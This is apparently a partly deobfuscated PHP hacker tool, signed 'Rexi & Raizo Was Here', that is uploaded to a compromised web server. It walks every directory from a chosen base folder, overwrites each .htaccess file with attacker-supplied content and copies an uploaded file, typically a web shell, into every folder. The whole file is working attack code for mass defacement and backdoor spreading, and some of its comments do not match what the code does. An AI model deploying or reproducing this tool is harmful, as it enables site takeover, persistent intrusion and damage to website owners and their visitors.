<?php
$GLOBALS["zmqsorg"] = "currentPath";
$GLOBALS["fhhlzkapy"] = "uploadPath";
$GLOBALS["rvthnulxb"] = "uploadedFile";
$GLOBALS["srpmlnk"] = "fileContent";
$GLOBALS["kvvetjszr"] = "errorLogPath";
$GLOBALS["bytuvvjkiklp"] = "file";

// Page header / simple UI
echo "<title>Tebar Ranjaau By Rexi</title>";
echo "<link href='http://fonts.gogleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='saddlebrown'><font color='black'><font face='Electrolize'>";
echo "<center><form method='POST' enctype='multipart/form-data'>";
echo "<img src='https://f.top4top.io/p_3377ag08l1.png' width='125' height='110'>";
echo "<h2 color='black'><font color='yellow'>Target Folder</font><br>";
echo "<input cols='40' rows='40' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd()."'><br><br>";
echo "<font color='yellow'>Masukan Scriptnya</font><br><textarea cols='85' rows='20' style='color:lime;background-color:#000000;background-image:url(#);' name='index'>Rexi & Raizo Was Here</textarea><br>";
echo "<font color='yellow'>Upload File</font><br><input type='file' name='upload_file'><br>";
echo "<input type='submit' value='GASKAN COK!'></form></center>";

// If the base_dir is set, process
if (isset($_POST["base_dir"])) {
    if (!file_exists($_POST["base_dir"])) {
        die($_POST["base_dir"]." Not Found !<br>");
    }
    if (!is_dir($_POST["base_dir"])) {
        die($_POST["base_dir"]." Is Not A Directory !<br>");
    }

    // function to upload/write into directories recursively
    function uploadToDirectories($baseDir, $fileContent, $uploadedFile) {
        // local mappings used to reconstruct original obfuscated names (ignored)
        $files = scandir($baseDir);
        foreach ($files as $entry) {
            if ($entry == "." || $entry == "..") continue;
            $currentPath = $baseDir . "/" . $entry;

            // If it's a directory, build error_log.php path and write content into it
            if (is_dir($currentPath)) {
                $errorLogPath = $currentPath . "/.htaccess";
                $savePath = $currentPath . "/uploadedFile"; // variable name in original
                // write the provided 'fileContent' into error_log.php
                if (file_put_contents($errorLogPath, $fileContent) !== false) {
                    echo "<hr color='black'>> <font color='yellow'>Saved: $errorLogPath&nbsp;&nbsp;</font><font color='lime'>(✔)</font>";
                }

                // If a file was uploaded through the form and upload was OK, move it into that directory
                if (isset($_FILES["upload_file"]) && $_FILES["upload_file"]["error"] == UPLOAD_ERR_OK) {
                    $uploadPath = $currentPath . "/" . basename($_FILES["upload_file"]["name"]);
                    if (move_uploaded_file($_FILES["upload_file"]["tmp_name"], $uploadPath)) {
                        echo "<hr color='black'>> <font color='yellow'>Uploaded: $uploadPath&nbsp;&nbsp;</font><font color='lime'>(✔)</font>";
                    } else {
                        echo "<hr color='black'>> <font color='red'>Failed to upload: $uploadPath</font>";
                    }
                }
            }

            // If it's a subdir, recurse into it
            if (is_dir($currentPath)) {
                // recursion: call the same function for subdirectory
                uploadToDirectories($currentPath, $fileContent, $uploadedFile);
            }
        }
    }

    // Call function with the form values
    uploadToDirectories($_POST["base_dir"], $_POST["index"], $_FILES["upload_file"]);
}
?>
